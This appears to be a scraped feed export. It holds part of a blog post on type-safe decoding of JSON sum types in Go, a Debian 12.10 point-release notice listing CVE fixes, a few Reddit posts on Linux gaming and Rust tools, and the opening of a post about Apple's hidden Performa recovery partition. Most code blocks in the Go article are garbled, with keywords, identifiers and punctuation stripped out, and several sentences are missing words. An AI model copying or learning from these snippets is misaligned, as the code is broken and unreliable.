phrase \"make illegal states unrepresentable\" when talking about sum types.</p><p>A  is called that way because... you guessed it. You can count the number of possible values (or cardinality) by  the number of possible values of each branch. So if I have the following sum type (example still in Rust, where they are called \"enums\"):</p><pre><code> subscribed</code></pre><p>The number of possible values for this \"sum type\" is: 1+2 = .</p><p>I'll leave it as an exercise to the reader to discuss and decide which of these two data structures is better adapted for representing this particular domain.</p><h2 tabindex=\"-1\">My first nil pointer panic in Go was due to lack of sum types</h2><p>Ok, that section title is a bit cheeky and probably not entirely true. But when I figured out what caused the panic in my code, the thought \"sum types would've caught this at compile time\"  cross my mind. I'm sure the astute reader could find better ways to structure my first implementation, even without sum types. But humor me for the sake of this article.</p><p>Let me say it now: This is  one of those \"Go should have sum types\" post. A lot has already been written on the topic and I don't want to get into the debate (although you'll probably guess where I stand). Let's just assume I want to  something like sum types in Go, then:</p><ol><li>How do I do so without straying too far from what's idiomatic in the language?</li><li>How do I encode and decode it, to and from JSON, with the structure we'll see below?</li></ol><p>This post is also  a criticism of Go. I came across this issue in my first Go project, and I actually enjoyed working with the language. Having shied away from Go for a while (notably because of lack of sum types), I finally gave it a try because it seemed a good fit for this project. The fast compile times, robust standard library, simplicity of the language, and great developer tooling all delivered on their promise.</p><p>For the anecdote, the first time I ran  was on the sample codebase from <a href=\"https://lets-go-further.alexedwards.net/\">Alex Edward's \"Let's Go Further\" book</a> (excellent book by the way), and I had to run it again because it was so much faster than what I was used to ( Haskell ), I thought nothing had happened.</p><p>Back to the historical context: I'm feeling very productive with Go on this particular project. The feedback loop is amazing, and I have a working proof-of-concept in just a couple of days. Code seems to just slip from my fingers, everything works on the first try, zero values and pointers do not scare me anymore, I just need to add this last thing and... then it hits me:</p><pre><code>2024/12/07 12:16:53 http: panic serving [::1]:60984:\nruntime error: invalid memory address or nil pointer dereference\ngoroutine 4 [running]:\nnet/http.(*conn).serve.func1()\n    /usr/local/go/src/net/http/server.go:1947 +0xb0\npanic({0x100a00f00?, 0x100f19b00?})\n    /usr/local/go/src/runtime/panic.go:785 +0x124\nexample/main.TransformAction(0x14000115e08)\n    /Users/nicolashery/dev/example/main.go:110 +0x1c\nexample/main.(*Server).handleTransformActions(0x140001cad80, {0x100ad6358, 0x14000160380}, 0x140001597c0)\n    /Users/nicolashery/dev/example/main.go:157 +0x20c\n[...]</code></pre><p>Ouch. Having done a lot of Haskell and (strict) TypeScript recently, I had forgotten one could get such runtime errors. But I don't panic (pun intended), and I carefully look at the code mentioned in the stack trace.</p><p>Below is a simplified version of the code for the sake of this article (the actual implementation had bigger structures and more cases). Can you spot the error? You have 5 seconds.</p><pre><code>a Action result  aType  ActionType_CreateObject\n\t\tresult  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject\n\t\tresult  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject\n\t\tresult  fmt aObjectID ActionType_DeleteAllObjects\n\t\tresult  result\n</code></pre><p>Ok, obviously you'll want to  on  to see what it is:</p><pre><code> Action \n\tType   ActionType \n\tObject Object    \n\tID     object Object Action  Action\n\t\tType   ActionType_CreateObject\n\t\tObject objectobject Object Action  Action\n\t\tType   ActionType_UpdateObject\n\t\tObject objectid  Action  Action\n\t\tType ActionType_DeleteObject\n\t\tIDid Action  Action\n\t\tType ActionType_DeleteAllObjects</code></pre><p>Did you see the error? If yes, then you can stop reading now and get back to work. I'm joking. Didn't see it in the allowed time limit? Don't worry, the Go type checker couldn't either.</p><h2 tabindex=\"-1\">Decoding JSON sum types in Go, take one</h2><p>How did I get to the code above, you might wonder? Well, imagine our service is receiving a JSON payload that looks like this:</p><pre><code></code></pre><p>These are all different types of \"actions\", and this JSON representation is not unreasonable. The <a href=\"https://swagger.io/specification/#discriminator-object\">OpenAPI specification</a> has a discriminator \"pet\" example, and the <a href=\"https://redocly.com/learn/openapi/discriminator\">Redocly documentation</a> a \"vehicle\" example, that are similar to this. (I have yet to come across an API with pets so apologies my example will be the less fun, but maybe more realistic.)</p><p>My naive attempt to decode this JSON, because I was in a rush (and maybe also because Copilot suggested it, if I'm being honest), was to create a struct which I call . This is a struct with all possible fields for every action type merged, and using pointers. The zero-value of pointers is  which will be set for fields that are \"unused\" by a particular action type. Here it is in all its glory:</p><pre><code> Action \n\tType   ActionType \n\tObject Object    \n\tID      ActionType \n\tActionType_CreateObject     ActionType \n\tActionType_UpdateObject     ActionType \n\tActionType_DeleteObject     ActionType \n\tActionType_DeleteAllObjects ActionType </code></pre><p>This works because  doesn't care if there are missing fields in the JSON payload, it will just set the zero-value for them:</p><pre><code>actions Action err  jsondataactions err  err\n</code></pre><p>We can also go the other way and call  to encode the struct into the same JSON representation as the snippet above. The  struct tag option will remove fields unused by each action type from the resulting JSON.</p><p>So we're off to the races, what can go wrong with a bag of pointers? Subtle bugs when trying to access a field that is  because unused by that action type, that's what:</p><pre><code> aType  ActionType_CreateObject\n\tresult  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject\n\tresult  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject\n\tresult  fmt aObjectID ActionType_DeleteAllObjects\n\tresult </code></pre><h2 tabindex=\"-1\">How do OpenAPI and Protobuf handle this?</h2><p>I pick myself up after this runtime panic, and have the following genius idea: There are code generators for OpenAPI, if I give them the specification for the <a href=\"https://swagger.io/specification/#discriminator-object\">JSON discriminated union</a> above, what do they output for Go? Also, <a href=\"http://protobuf.dev/\">Protocol Buffers</a> is a popular wire format that is based on code generation, and the <a href=\"https://protobuf.dev/programming-guides/editions/#oneof\">Oneof field</a> looks a lot like a sum type, so what do  generate for Go?</p><p>The OpenAPI schema for an action would look like this:</p><pre><code> object\n   type\n     object\n   string\n    </code></pre><p>If I feed this to the <a href=\"https://openapi-generator.tech/\">OpenAPI Generator</a> (note that I'm using the <code>useOneOfDiscriminatorLookup=true</code> option for better output), I get what I'll call a <em>\"bag of all the branches\"</em>:</p><pre><code> Action \n\tcreateObject     CreateObject\n\tupdateObject     UpdateObject\n\tdeleteObject     DeleteObject\n\tdeleteAllObjects DeleteAllObjects\n CreateObject \n\tObject Object </code></pre><p>It generates an  method for  that:</p><ul><li>first decodes the JSON to check the  field (this is thanks to the <code>useOneOfDiscriminatorLookup=true</code> codegen option)</li><li>according to the value of , it chooses the appropriate branch and decodes the JSON using the corresponding struct (, , etc.)</li></ul><p>Edited for clarity, it looks something like this:</p><pre><code>a Actiondata  tagged \n\t\tType ActionType  err  jsondatatagged err  err\n\t err  taggedType  ActionType_CreateObject\n\t\terr  jsondataacreateObject ActionType_UpdateObject\n\t\terr  jsondataaupdateObject ActionType_DeleteObject\n\t\terr  jsondataadeleteObject ActionType_DeleteAllObjects\n\t\terr  jsondataadeleteAllObjects</code></pre><p>To get the actual underlying value, the generator creates a method (which I'll name  here) that returns the first non-nil pointer:</p><pre><code>a Action any  acreateObject  acreateObject\n\t aupdateObject  aupdateObject\n\t adeleteObject  adeleteObject\n\t adeleteAllObjects  adeleteAllObjects\n\t</code></pre><p>So this is already a big improvement on my  approach. Since the accessor method to the underlying value returns , I'm now checking the  which can be one of the more precise structs (, , etc.):</p><pre><code>action Action result  v  actionCreateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameUpdateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameDeleteObject\n\t\tresult  fmt vIDDeleteAllObjects\n\t\tresult  result\n</code></pre><p>Some issues remain though:</p><ul><li>I \"trust\" the  return value of the accessor method to be one of the action structs (, , etc.) and nothing else</li><li>If I add a \"branch\" (i.e. another action type), I can easily forget to update the  statement in </li></ul><p>Another generator that I tried out, <a href=\"https://github.com/oapi-codegen/oapi-codegen\">oapi-codegen</a>, uses a slightly different approach. It holds on to a  and delays the decoding until we call an equivalent of the  accessor method:</p><pre><code> Action \n\tunion jsonRawMessage\n CreateObject \n\tType   \n\tObject Object a Actionany err</code></pre><p>The decoding works essentially the same, first decode enough to check the  field, then according to its value unmarshal into one of the action structs (, , etc.). The <a href=\"https://pkg.go.dev/encoding/json#example-RawMessage-Unmarshal\"> documentation</a> actually has a similar example.</p><p>Since delaying JSON decoding wasn't particularly useful in my case, I didn't choose this route. But I wanted to mention it for completeness' sake.</p><p>What about  (aka \"Protobuf\")? I found the following particularly interesting in their <a href=\"https://pkg.go.dev/encoding/json#example-RawMessage-Unmarshal\">Go generated code guide</a>:</p><blockquote><p>For a oneof field, the protobuf compiler generates a single field with an interface type . It also generates a struct for each of the singular fields within the oneof. These all implement this  interface.</p></blockquote><p>Let's try it out. Even though we're working with a JSON API, a Protobuf definition for our data model could look like this:</p><pre><code> value  create_object  update_object  delete_object  delete_all_objects  object </code></pre><p>The generated code indeed creates an interface  with a single method, as well as an  struct that holds a field with that interface type:</p><pre><code> Action \n\tValue isAction_Value  isAction_Value  Action_CreateObject \n\tCreateObject CreateObject Action_CreateObject</code></pre><p>Now these two code generators, OpenAPI and Protobuf, will be the inspiration for my second attempt at decoding the JSON sum type in a more type-safe way...</p><h2 tabindex=\"-1\">Decoding JSON sum types in Go, take two</h2><p>After a bit of searching on the topic of \"Go sum types\", I stumbled across this: <a href=\"https://github.com/alecthomas/go-check-sumtype\">go-check-sumtype</a>. From the README:</p><blockquote><p>A typical proxy for representing sum types in Go is to use an interface with an unexported method and define each variant of the sum type in the same package to satisfy said interface. This guarantees that the set of types that satisfy the interface is closed at compile time.</p></blockquote><p>This \"interface with an unexported method\" (also called \"sealed interface\", or \"marker interface\") sounded like a reasonable way to do it. And it's also what the Protobuf codegen seems to be using.</p><p>I replaced my single \"bag of all the fields\"  struct with a sealed interface  and a struct for each variant (, , etc.). Each variant struct implements the interface:</p><pre><code> IsAction  CreateObject \n\tObject Object CreateObject UpdateObject \n\tObject Object UpdateObject DeleteObject \n\tID DeleteObject DeleteAllObjects DeleteAllObjects</code></pre><p>Now I am quite pleased. Not only do these action-specific structs provide more type-safety, but if I forget to handle a variant in my  statement (or if I add a new one that implements the sealed interface), the  linter will catch it instead of getting an error at runtime!</p><pre><code>action Action result  v  actionCreateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameUpdateObject\n\t\tresult  fmt vObjectType vObjectID vObjectNameDeleteObject\n\t\tresult  fmt vIDDeleteAllObjects\n\t\tresult  result\n</code></pre><p>I still needed to figure out how to decode the JSON sum types payload into this interface and structs. You can't unmarshal into an interface value directly, you need to pass a concrete type. So I created a wrapper struct like so:</p><pre><code> Action \n\tvalue IsAction\n</code></pre><p>I also found the <a href=\"https://github.com/nishanths/exhaustive\">exhaustive</a> linter, so why stop at sum types when you can also have enums! I defined one for action types, which are used as \"tags\" in my tagged union, along with the proper methods for JSON and string representations:</p><pre><code> ActionType \n\tActionType_CreateObject ActionType \n\tActionType_UpdateObject\n\tActionType_DeleteObject\n\tActionType_DeleteAllObjects\nt ActionTypet ActionTypedata t ActionType</code></pre><p>I then defined  for my  wrapper struct like so:</p><pre><code>a Actiondata  tag \n\t\tType ActionType  err  jsondatatag err  err\n\t v IsAction\n\t tagType  ActionType_CreateObject\n\t\tv CreateObject ActionType_UpdateObject\n\t\tv UpdateObject ActionType_DeleteObject\n\t\tv DeleteObject ActionType_DeleteAllObjects\n\t\tv DeleteAllObjects err  jsondata v err  err\n\t\n\n\tavalue  v\n\t</code></pre><p>This works similarly to what we saw in the OpenAPI generated code:</p><ul><li>first decode only what is needed in the JSON to check the  field</li><li>second, according to the value of , choose the appropriate variant struct of the sum type (, , etc.) and use it to decode the JSON payload</li></ul><p>For the other way around, I also defined  for the wrapper struct:</p><pre><code>a Action\n\tv  avalue\n\n\tdata err  jsonv err  err\n\t tagged any\n\t err  jsondatatagged err  err\n\t vCreateObject\n\t\ttagged ActionType_CreateObject\n\tUpdateObject\n\t\ttagged ActionType_UpdateObject\n\tDeleteObject\n\t\ttagged ActionType_DeleteObject\n\tDeleteAllObjects\n\t\ttagged ActionType_DeleteAllObjects\n\t jsontagged</code></pre><ul><li>first encode the wrapped interface as JSON (unlike decoding, we can do this because the interface here will be initialized with an underlying concrete type: , , etc.)</li><li>second, to add the tag in the  field, we do a roundtrip: decode into a , add the tag to that map, and re-encode the map into JSON</li></ul><p>Notice that I use the  linter in  to make sure I handle all possible tags, and I use the  linter in  to make sure I handle all possible variant structs. So given I keep the \"enum\" and \"sum type\" up-to-date, I will have exhaustiveness checking in both these methods (in addition to other methods or functions, such as  we saw earlier).</p><p>That's it! Yes, there is a bit of boilerplate, but if one is using Go they are probably already OK with a little boilerplate here and there. Also, between AI coding assistants and other codegen tools, the cost of boilerplate can be mitigated. And finally there is that thing we say, \"code is read (and maintained) much more often than written\"? So I'd argue the added type-safety and the fact that we catch issues at compile time instead of runtime may be worth the tradeoff.</p><h2 tabindex=\"-1\">Alternative implementations</h2><p>Of course, the implementation described above is only  of decoding JSON sum types in Go. Below are a couple alternatives, some of which we've already mentioned.</p><pre><code> Action \n\tcreateObject     CreateObject\n\tupdateObject     UpdateObject\n\tdeleteObject     DeleteObject\n\tdeleteAllObjects DeleteAllObjects\n</code></pre><pre><code> Action \n\tpayload jsonRawMessage\n</code></pre><p>With the \"sealed interface\" approach I ended up using, I also considered an implementation of  that doesn't require an encode/decode roundtrip to add the tag, at the cost of a bit more boilerplate. It uses <a href=\"https://gobyexample.com/struct-embedding\">struct embedding</a> instead (<a href=\"https://github.com/nicolashery/example-tagged-union/blob/main/go/altjson.go\">full example here</a>):</p><pre><code>a Action data  err  v  avalueCreateObject\n\t\ttagged \n\t\t\tType ActionType \n\t\t\tCreateObject\n\t\t\n\t\t\tType         ActionType_CreateObject\n\t\t\tCreateObjectv\n\t\tdata err  jsontagged data err\n</code></pre><p>Finally, it is worth mentioning that there are different ways to represent sum types in JSON, notably:</p><ul><li> (the one used in this article): <code>{\"type\": \"delete_object\", \"id\": \"1\", \"soft_delete\": true}</code></li><li>: <code>{\"type\": \"delete_object\", \"value\": {\"id\": \"1\", \"soft_delete\": true}}</code></li><li>: <code>{\"delete_object\": {\"id\": \"1\", \"soft_delete\": true}}</code></li></ul><p>The naming is taken from the Rust library <a href=\"https://serde.rs/enum-representations.html\">Serde's documentation</a>, which provides a good explanation and examples for each representation.</p><p>All JSON representations are possible with the Go implementation of sum types described in this post (you can find the adjacently tagged <a href=\"https://github.com/nicolashery/example-tagged-union/blob/main/go/altjson.go\">full example here</a>).</p><h2 tabindex=\"-1\">What Go could have been: V lang?</h2><p>I'll let the project's website do its own marketing:</p><blockquote><p>V is very similar to Go. If you know Go, you already know ≈80% of V.</p></blockquote><blockquote><p>[...] V is very similar to Go, and its domain is similar to Rust's [...]</p></blockquote><p>Wait... The simplicity of Go, but with enums and sum types? Yes, please!</p><p>I tried porting my example to V, and I have to admit it works out quite nicely (<a href=\"https://github.com/nicolashery/example-tagged-union/blob/main/vlang/main.v\">full source here</a>):</p><pre><code>\n\tuser\n\tgroup\n\n\tid   \n\tname \n\tobject Object\n\n\tobject Object\n\n\tid  CreateObject  UpdateObject  DeleteObject  DeleteAllObjects\n\naction Action action \n\t\tCreateObject \n\t\tUpdateObject \n\t\tDeleteObject \n\t\tDeleteAllObjects </code></pre><p>The  expression has exhaustiveness checking, of course. And the  sum type decodes from/encodes to JSON right out-of-the box (with the caveat that, at the time of writing, it uses the adjacently tagged representation with no way of configuring it).</p><p>Before getting too excited it is worth noting that V is very much a niche language, and can't be compared to Go's popularity and ecosystem. Our industry works in mysterious ways, who knows why some languages gain traction while others don't. Also, this might have some truth to it:</p><blockquote><p>There are only two kinds of languages: the ones people complain about and the ones nobody uses.</p><p><strong>Bjarne Stroustrup, The C++ Programming Language</strong></p></blockquote><p>Nevertheless, I found the V language interesting! It's a garbage-collected language that seems to have found a sweet spot between Go's simplicity and Rust's powerful type system.</p><h2 tabindex=\"-1\">Examples in other languages</h2><p>If you made it this far, I'll leave you with a link to <a href=\"https://github.com/nicolashery/example-tagged-union\">this repository</a>. It contains an implementation of the example sum type from this article, with JSON encoding/decoding (where applicable), in the following languages:</p><ul></ul>","contentLength":19031,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcduqh/decoding_json_sum_types_in_go_without_panicking/"},{"title":"Debian point release 12.10.....if you care and use.","url":"https://www.debian.org/News/2025/20250315","date":1742100124,"author":"/u/unixbhaskar","guid":381,"unread":true,"content":"<p>The Debian project is pleased to announce the tenth update of its\nstable distribution Debian 12 (codename ).\nThis point release mainly adds corrections for security issues,\nalong with a few adjustments for serious problems. Security advisories\nhave already been published separately and are referenced where available.</p><p>Please note that the point release does not constitute a new version of Debian\n12 but only updates some of the packages included. There is\nno need to throw away old  media. After installation,\npackages can be upgraded to the current versions using an up-to-date Debian\nmirror.</p><p>Those who frequently install updates from security.debian.org won't have\nto update many packages, and most such updates are\nincluded in the point release.</p><p>New installation images will be available soon at the regular locations.</p><p>Upgrading an existing installation to this revision can be achieved by\npointing the package management system at one of Debian's many HTTP mirrors.\nA comprehensive list of mirrors is available at:</p><p>This stable update adds a few important corrections to the following packages:</p><table border=\"0\" summary=\"\"><tbody><tr><td>Fix crash when modifying userPassword using malformed input [CVE-2024-2199 CVE-2024-8445]; prevent denial of service while attempting to log in with a user with a malformed hash in their password [CVE-2024-5953]; prevent denial of service on the directory server with specially-crafted LDAP query [CVE-2024-3657]</td></tr><tr><td>New upstream bugfix release</td></tr><tr><td>Fix tests causing FTBFS on the auto-builder network</td></tr><tr><td>Fix unintended HTTPS upgrades or premature reversion to HTTP when both subdomains and parent domains are used [CVE-2024-9681]; prevent stopping of stunnel before retries in the built-time tests; fix possible credentials leakage issues [CVE-2024-11053 CVE-2025-0167]; fix test failures due to port clashes</td></tr><tr><td>Do not cache result of get_default_value_for_field</td></tr><tr><td>Fix issue when rendering an invalid monochrome DICOM image [CVE-2024-47796]; ensure: HighBit &lt; BitsAllocated [CVE-2024-52333]; fix possible overflows when allocating memory [CVE-2024-27628]; fix two segmentation faults [CVE-2024-34508 CVE-2024-34509]; fix arbitrary code execution issue [CVE-2024-28130]; fix buffer overflow issues [CVE-2025-25472 CVE-2025-25474]; fix NULL pointer dereference issue [CVE-2025-25475]</td></tr><tr><td>Increase Linux kernel ABI to 6.1.0-32; rebuild against proposed-updates</td></tr><tr><td>Add missing parameters for source upload target</td></tr><tr><td>Fix authentication bypass [CVE-2024-21543]</td></tr><tr><td>Fix overflow condition in PeCoffLoaderRelocateImage() [CVE-2024-38796]; fix potential UINT32 overflow in S3 ResumeCount [CVE-2024-1298]</td></tr><tr><td>Fix tests on machines with 2 vCPU or fewer</td></tr><tr><td>Fix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]</td></tr><tr><td>Fix build failure on single-CPU machines</td></tr><tr><td>Fix buffer overflow when printing assertion failure message [CVE-2025-0395]; fix memset performance for unaligned destinations; fix TLS performance degradation after dlopen() usage; avoid integer truncation when parsing CPUID data with large cache sizes; ensure data passed to the rseq syscall are properly initialized</td></tr><tr><td>New upstream security release [CVE-2023-34440 CVE-2023-43758 CVE-2024-24582 CVE-2024-28047 CVE-2024-28127 CVE-2024-29214 CVE-2024-31068 CVE-2024-31157 CVE-2024-36293 CVE-2024-37020 CVE-2024-39279 CVE-2024-39355]</td></tr><tr><td>Fix arbitrary code execution issues [CVE-2024-56201 CVE-2024-56326]</td></tr><tr><td>Fix build failure on single-CPU systems</td></tr><tr><td>Fix CSRF vulnerability on 2FA registration interface [CVE-2024-52948]</td></tr><tr><td>Set correct default permissions for shared memory [CVE-2024-46544]</td></tr><tr><td>Fix buffer overflow vulnerability [CVE-2023-32181 CVE-2023-22652]</td></tr><tr><td>Add option to read username/password from file [CVE-2023-35789]</td></tr><tr><td>Fix out-of-bounds read in gnu_longlink() [CVE-2021-33643]; fix out-of-bounds read in gnu_longname() [CVE-2021-33644]; fix memory leak in th_read() [CVE-2021-33645]; fix memory leak in th_read() [CVE-2021-33646]</td></tr><tr><td>New upstream release; bump ABI to 32</td></tr><tr><td>Fix multi axes movement on single axis G0 MDI call</td></tr><tr><td>New upstream stable release; fix security issue [CVE-2024-21096]; fix denial of service issue [CVE-2025-21490]</td></tr><tr><td>Impose response limits on HTTP server connections [CVE-2025-26819]</td></tr><tr><td>Install fcitx icons to the correct locations</td></tr><tr><td>Ignore test warnings from astropy</td></tr><tr><td>Fix possible bypass of client certificate authentication [CVE-2025-23419]</td></tr><tr><td>Fix CSRF vulnerability [CVE-2023-45857]; fix potential vulnerability in URL when determining an origin [CVE-2024-57965]</td></tr><tr><td>Fix mishandling of non-integer values leading to denial of service in nanoid [CVE-2024-55565]; fix parsing of external untrusted CSS [CVE-2023-44270]</td></tr><tr><td>Fix build failure arising from changed timeout API</td></tr><tr><td>New upstream stable release; harden PQescapeString and allied functions against invalidly-encoded strings; improve behavior of libpq's quoting functions [CVE-2025-1094]</td></tr><tr><td>Fix behavior when parsing chunked transfer encoding bodies and zero-length Content-Length headers [CVE-2023-40175]; limit size of chunk extensions [CVE-2024-21647]; prevent manipulation of headers set by intermediate proxies [CVE-2024-45614]</td></tr><tr><td>Fix regular expression-based denial of service issue [CVE-2023-36053], denial of service issues [CVE-2024-38875 CVE-2024-39614 CVE-2024-41990 CVE-2024-41991], user enumeration issue [CVE-2024-39329], directory traversal issue [CVE-2024-39330], excessive memory consumption issue [CVE-2024-41989], SQL injection issue [CVE-2024-42005]</td></tr><tr><td>Run tests only if /tmp is tmpfs, otherwise they are known to fail</td></tr><tr><td>Avoid segmentation fault if a SIGTERM is received during startup</td></tr><tr><td>Fix parallel running of tests</td></tr><tr><td>Fix sandbox bypass vulnerability in Nasal scripts [CVE-2025-0781]</td></tr><tr><td>Apply GPO policy consistently [CVE-2023-3758]</td></tr><tr><td>Fix vulnerable parsing of control characters in paths served by mod_dav_svn [CVE-2024-46901]</td></tr><tr><td>Ignore test warnings from astropy</td></tr><tr><td>New upstream release; update data for Paraguay; update leap second information</td></tr><tr><td>Fix URL of public Vagrant registry</td></tr><tr><td>Fix crash when expanding  in substitute [CVE-2023-2610]; fix buffer-overflow in vim_regsub_both() [CVE-2023-4738]; fix heap use after free in ins_compl_get_exp() [CVE-2023-4752]; fix heap-buffer-overflow in vim_regsub_both [CVE-2023-4781]; fix buffer-overflow in trunc_string() [CVE-2023-5344]; fix stack-buffer-overflow in option callback functions [CVE-2024-22667]; fix heap-buffer-overflow in ins_typebuf (CVE-2024-43802]; fix use-after-free when closing a buffer [CVE-2024-47814]; fix build failure on 32-bit architectures</td></tr><tr><td>Fix mishandling of semicolons in userinfo in URLs [CVE-2024-38428]</td></tr><tr><td>Allow direct kernel boot with kernels &gt;= 6.12</td></tr></tbody></table><p>This revision adds the following security updates to the stable release.\nThe Security Team has already released an advisory for each of these\nupdates:</p><p>The following packages were removed due to circumstances beyond our control:</p><p>The installer has been updated to include the fixes incorporated\ninto stable by the point release.</p><p>The complete lists of packages that have changed with this revision:</p><p>The current stable distribution:</p><p>Proposed updates to the stable distribution:</p><p>stable distribution information (release notes, errata etc.):</p><p>Security announcements and information:</p><p>The Debian Project is an association of Free Software developers who\nvolunteer their time and effort in order to produce the completely\nfree operating system Debian.</p><p>For further information, please visit the Debian web pages at\n<a href=\"https://www.debian.org/\">https://www.debian.org/</a>, send mail to\n&lt;press@debian.org&gt;, or contact the stable release team at\n&lt;debian-release@lists.debian.org&gt;.</p>","contentLength":7343,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jcdupk/debian_point_release_1210if_you_care_and_use/"},{"title":"What is Valve's end goal with linux and gaming?","url":"https://www.reddit.com/r/linux/comments/1jcd0vy/what_is_valves_end_goal_with_linux_and_gaming/","date":1742097093,"author":"/u/Karmic_Backlash","guid":384,"unread":true,"content":"<p>I'll be the first to admit that I am a bit of a fan of valve if only at least in Stockholm Syndrome. I own a steamdeck and use their storefront, and have bought many games from them. However, as a linux user, over the years I've developed a strange feeling about their linux push. </p><p>So, first thing thats crossed my mind is their main selling point in the space, Proton (and by proxy, wine). The whole idea is running windows applications and specifically games on linux. But that doesn't really feel like a long term solution. It basically requires that anything to do with gaming necessarily depends on windows and its systems. If people just stopped making windows builds of their stuff then linux gaming would suffer just as much.</p><p>You would think that by now they would have tried to address this, and while I know the classic XKCD joke of \"14 Competing Standards\" rings here, but Valve has the best chance out of everyone to try, even if it fails, they'd still ideally have wine to fall back on.</p><p>My second question is more to do with their lack of any movement outside of gaming. Don't get me wrong, they are a  platform and gaming focused developer. I'm not expecting them to shoulder the whole of the desktop on their shoulders, but it would be a serious feather in their cap to directly advertise that their software can do more then  gaming. The whole desktop mode of their flagship distro is fully featured just like any other.</p><p>Third question, and this is more of a plea for context if it exists then a question, have they said anything about their long term goals anywhere, because I haven't heard anything. I'd love to know if they do actually have a roadmap, if only to know how to set my expectations.</p>","contentLength":1710,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Dioxus 0.6 is incredible, why isn't anyone talking about it.","url":"https://www.reddit.com/r/rust/comments/1jcar25/dioxus_06_is_incredible_why_isnt_anyone_talking/","date":1742089413,"author":"/u/Incredible_guy1","guid":375,"unread":true,"content":"<p>Iv'e been using tauri for a while to build my desktop apps and whiles its an amazing tool, a few of my complains include:</p><ul><li>projects become too complex to manage</li></ul><p>Dioxus basically fixes all of this and keeps everything in native rust , while using a tsx-like syntax for building , how does this not get the spotlight?</p>","contentLength":312,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I built a crate to generate LSP servers using Tree-sitter queries.","url":"https://www.reddit.com/r/rust/comments/1jcajk7/i_built_a_crate_to_generate_lsp_servers_using/","date":1742088763,"author":"/u/adclz","guid":564,"unread":true,"content":"<p>This is my second side project in Rust. There are probably some issues, and I haven’t implemented all the features I have in mind yet.</p><p>The main inspiration comes from GitHub’s StackGraph. Since VS Code released an SDK last summer that allows LSP servers to run when compiled to WASI, I wanted to create something that could generate a cross-platform extension from any Tree-sitter grammar.</p><p>It all started as a draft, but I ended up enjoying working on it a bit too much.</p>","contentLength":472,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Apple's long-lost hidden recovery partition from 1994 has been found","url":"https://www.downtowndougbrown.com/2025/03/apples-long-lost-hidden-recovery-partition-from-1994-has-been-found/","date":1742083623,"author":"chmaynard","guid":149,"unread":true,"content":"<p>In my <a href=\"https://www.downtowndougbrown.com/2025/03/the-gooey-rubber-thats-slowly-ruining-old-hard-drives/\" data-type=\"post\" data-id=\"10245\" target=\"_blank\" rel=\"noreferrer noopener\">last post about hard drives that go bad over time</a>, I hinted at having rescued a lost piece of obscure Apple software history from an old 160 MB Conner hard drive that had its head stuck in the parked position. This post is going to be all about it. It’s the tale of a tad bit of an obsession, what felt like a hopeless search, and how persistence eventually paid off. There’s still an unsolved mystery too, so I’m hoping others will see this and help to fill in the blanks!</p><blockquote><p><strong>The LC 550’s Secret Partition</strong></p><p>If Apple’s programmers, in creating the Performa series, were aiming to make idiot-proof computers, they were serious about it. The Performa 550 is an amazing case in point. When you run the included Apple Backup program (see Chapter 15), you get a little surprise that you didn’t count on: a  on your hard drive!</p><p>This invisible chunk of hard drive space contains a miniature, invisible System Folder. Apple’s internal memo explains it this way:</p><p>“When a system problem (one that prevents the Performa from booting) is detected, a [dialog box] informs the user of a system problem. The user can choose to fix the problem manually or to reinstall software from the backup partition’s Mini System Folder.”</p><p>If you choose to reinstall your System software, you get the wristwatch cursor for a moment while the miniature System Folder is silently copied to your main hard-drive partition. The Performa restarts from the restored hard drive, and the invisible system partition disappears once again.</p><p>We got a Performa team member to admit that this kind of sneaky save-the-users-from-themselves approach may well be adopted in other Performa models.</p><p>Who knows what goodness lurks in the hearts of men?</p></blockquote><p>Cool! Although I have owned my own copy of this book for decades, I had no recollection of ever reading this little blurb. The book, if you’re curious, is <a href=\"https://apple.fandom.com/wiki/Macworld_Mac_Secrets\" target=\"_blank\" rel=\"noreferrer noopener\">Macworld Mac Secrets</a> by David Pogue and Joseph Schorr. I found this whole functionality very intriguing, particularly because I had what felt like a very personal connection to it: the very first Mac that my family had when I was growing up was a Performa 550. I don’t think I have any pictures from back then, but in the meantime I’ve acquired one that looks exactly identical, so here’s a (slightly blurry) view of the type of machine I’m talking about in this post:</p><p>I know that many people think the LC/Performa 5xx case style is ugly, but I really like it! I’m definitely biased though.</p><p>This is an early model manufactured in September of 1993, which came with a caddy-loading CD-ROM drive (AppleCD 300i). Like other Macs from the same era, <a href=\"https://tidbits.com/1994/01/31/apple-improves-cd-drive/\" target=\"_blank\" rel=\"noreferrer noopener\">newer versions from 1994 came with a tray-loading drive instead</a> (AppleCD 300i Plus). For comparison, here’s a photo of a late-model Performa 550 with a manufacture date of March 1994 that <a href=\"https://bsky.app/profile/re4mat.bsky.social\" target=\"_blank\" rel=\"noreferrer noopener\">re4mat</a> kindly gave me permission to share here:</p><p>Pierre asked me if I had a copy of Apple’s software restoration CD for the Performa 550, and if I knew how to get it working in an emulator in order to try out this special functionality. I <a href=\"https://macintoshgarden.org/apps/macintosh-os-71x\" target=\"_blank\" rel=\"noreferrer noopener\">pointed him to a download link</a> for the Performa CD for the 500 Series, version 7.1P6:</p><p>If you weren’t using multimedia computers in the early 1990s, you might not recognize the weird rectangular container that this CD is enclosed inside of. It’s a CD caddy, and it’s what was used for inserting CDs into computers like the first one pictured above. You would open the caddy by squeezing the top right and bottom right ends toward each other, stick the disc into it, close it, and then push it into the slot in the computer, similarly to how you would insert a floppy disk. I really don’t miss these things one bit!</p><p>Back to the story, though. I also <a href=\"https://www.emaculation.com/forum/viewtopic.php?t=8031\" target=\"_blank\" rel=\"noreferrer noopener\">gave Pierre some tips for using the restore CD in an emulator</a>. Nowadays, my advice is outdated because it’s much easier to use Apple restore CDs in at least one emulator — <a href=\"https://www.mamedev.org/\" target=\"_blank\" 